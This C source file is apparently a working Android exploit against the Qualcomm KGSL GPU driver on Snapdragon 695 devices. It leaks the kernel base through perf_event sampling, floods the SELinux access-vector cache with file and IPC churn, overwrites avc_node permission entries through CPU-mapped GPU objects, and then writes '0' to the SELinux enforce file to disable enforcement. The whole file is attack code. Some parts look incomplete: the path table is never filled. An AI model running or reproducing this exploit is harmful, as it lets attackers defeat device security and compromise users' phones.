#include "avc_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>
#include <sys/stat.h>

static int kgsl_fd = -1;
static void *uaf_map = NULL;
static int log_level = 1;

#define LOG_INFO(fmt, ...) do { if (log_level >= 1) printf("[INFO] " fmt "\n", ##__VA_ARGS__); } while(0)
#define LOG_ERROR(fmt, ...) do { printf("[ERROR] " fmt "\n", ##__VA_ARGS__); } while(0)

static void die(const char *msg) { perror(msg); exit(1); }

/* ==================== PM4 ==================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf) < 0) die("gpuobj_info");
    if (gpuaddr) *gpuaddr = inf.gpuaddr;
    return 0;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc) < 0) return -1;
    if (out_ts) *out_ts = gc.timestamp;
    return 0;
}

/* ==================== KASLR ==================== */
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) return 0;
    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head, tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;
    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ==================== チャーン（強化版） ==================== */
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0, churn_built = 0;

static void churn_build(void) {
    if (churn_built) return;
    const char *dirs[] = {
        "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
        "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
        "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
        "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
        "/system/lib64", "/data/data", "/data/app", "/data/user/0",
        "/dev", "/proc",
    };
    for (unsigned d = 0; d < sizeof(dirs)/sizeof(dirs[0]) && churn_npaths < CHURN_MAX_PATHS; d++) {
        DIR *dir = opendir(dirs[d]);
        if (!dir) continue;
        struct dirent *de;
        while ((de = readdir(dir)) && churn_npaths < CHURN_MAX_PATHS) {
            if (de->d_name[0] == '.') continue;
            char p[192];
            snprintf(p, sizeof(p), "%s/%s", dirs[d], de->d_name);
            int fd = open(p, O_RDONLY | O_CLOEXEC);
            if (fd >= 0) close(fd);
            churn_npaths++;
        }
        closedir(dir);
    }
    churn_built = 1;
    LOG_INFO("churn paths = %d", churn_npaths);
}
static void churn_round_intensive(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    char fake[256];
    for (int i = 0; i < 10000; i++) {
        snprintf(fake, sizeof(fake), "/proc/self/fd/%d", i);
        int fd = open(fake, O_RDONLY);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) close(s);
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

/* ==================== setenforce0 ==================== */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ==================== CPUマッピングを用いた小さなオブジェクトのスキャン ==================== */
static int scan_small_objects(int num_objects, uint64_t alloc_flags) {
    LOG_INFO("Allocating %d small objects with CPU map and scanning for avc_node", num_objects);
    int found = 0;
    for (int i = 0; i < num_objects; i++) {
        int id = gpuobj_alloc(0x1000, alloc_flags);
        if (id < 0) continue;
        void *map = gpuobj_mmap(0x1000, id);
        if (!map) { gpuobj_free(id); continue; }
        uint32_t *p = (uint32_t *)map;
        for (int off = 0; off < 0x1000; off += AVC_NODE_STRIDE) {
            uint32_t sid = p[off/4];
            uint32_t tsid = p[off/4 + 1];
            uint32_t tclass = p[off/4 + 2];
            if (sid >= 1 && sid <= 0x3fff && tsid == 2 && tclass == 1) {
                p[off/4 + 3] = 0xFFFFFFFF;
                found++;
                LOG_INFO("Flipped avc_node in object %d at offset 0x%x (sid=%u)", id, off, sid);
            }
        }
        munmap(map, 0x1000);
        gpuobj_free(id);
    }
    return found;
}

/* ==================== メイン ==================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    LOG_INFO("avc_bypass for Snapdragon 695 - final attempt with small objects");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    LOG_INFO("kgsl fd=%d", kgsl_fd);

    uint64_t kaslr = detect_kaslr();
    if (!kaslr) { LOG_ERROR("KASLR detection failed"); close(kgsl_fd); return 1; }
    LOG_INFO("KASLR = 0x%lx", kaslr);

    // 1. 強力なチャーンで AVC ノードを大量生成
    LOG_INFO("Generating AVC entries with intensive churn");
    for (int c = 0; c < 5; c++) {
        churn_round_intensive();
        LOG_INFO("Churn round %d done", c+1);
    }

    // 2. 小さな GPU オブジェクトを 200 個確保し、CPU マップでスキャン & フリップ
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int flips = scan_small_objects(200, alloc_flags);
    LOG_INFO("Total flips from small objects: %d", flips);

    // 3. setenforce 0 試行
    int ok = try_setenforce0();
    if (!ok) {
        sleep(1);
        ok = try_setenforce0();
    }

    if (ok) {
        LOG_INFO("SUCCESS: SELinux permissive");
    } else {
        LOG_ERROR("Failed to setenforce 0");
    }

    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8];
        ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; LOG_INFO("getenforce: %s", v); }
    }

    close(kgsl_fd);
    return ok ? 0 : 1;
}
